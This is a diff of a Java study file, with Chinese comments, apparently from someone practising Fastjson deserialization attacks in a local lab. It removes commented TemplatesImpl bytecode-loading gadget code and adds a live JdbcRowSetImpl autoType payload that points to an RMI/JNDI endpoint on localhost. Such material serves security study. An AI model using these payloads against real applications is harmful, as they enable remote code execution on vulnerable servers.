@@ -45,36 +45,9 @@ public class Fastjson {
 //        JSON.parseObject("{\"@type\":\"org.example.App$User\",\"id\":\"123\"}", Feature.SupportNonPublicField);
 
 
-//        复习一下动态类加载
-//        Class<? extends ClassLoader> aClass = ClassLoader.class;
-//        Method defineClass = aClass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-//        defineClass.setAccessible(true);
-//        byte[] bytes = Files.readAllBytes(Paths.get("src/main/java/EvalCode/Calc.class"));
-//        Class aClass1 = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), bytes, 0, bytes.length);
-//        aClass1.newInstance();
-//
-//        TemplatesImpl templates = new TemplatesImpl();
-//        templates.newTransformer();
 
 
-//        复习一下通过TemplatesImpl进行动态类加载打上去链子
-//        TemplatesImpl templates = new TemplatesImpl();
-//        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
-//
-//        Field nameField = templatesClass.getDeclaredField("_name");
-//        nameField.setAccessible(true);
-//        nameField.set(templates,"L3ttuc3");
-//
-//        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
-//        bytecodesField.setAccessible(true);
-//        byte[][] bytes = {Files.readAllBytes(Paths.get("src/main/java/EvalCode/Calc.class"))};
-//        bytecodesField.set(templates,bytes);
-//
-//        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
-//        tfactoryField.setAccessible(true);
-//        tfactoryField.set(templates,new TransformerFactoryImpl());
-//
-//        templates.newTransformer();
+
 
 
 
@@ -148,8 +121,12 @@ public class Fastjson {
         JdbcRowSetImpl链子
         这个是必须JNDI，所以只有RMI是不行的
          */
-        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"rmi://localhost:1099/RMIObj\",\"autoCommit\": true}";
-        JSON.parseObject(payload,Feature.SupportNonPublicField);
+
+//        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"rmi://localhost:1023/RMIObj\",\"autoCommit\": false}";
+//        JSON.parse(payload,Feature.SupportNonPublicField);
+
+        String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1023/RMIObj\", \"autoCommit\":false}";
+        JSON.parse(payload2);
     }
 }
 
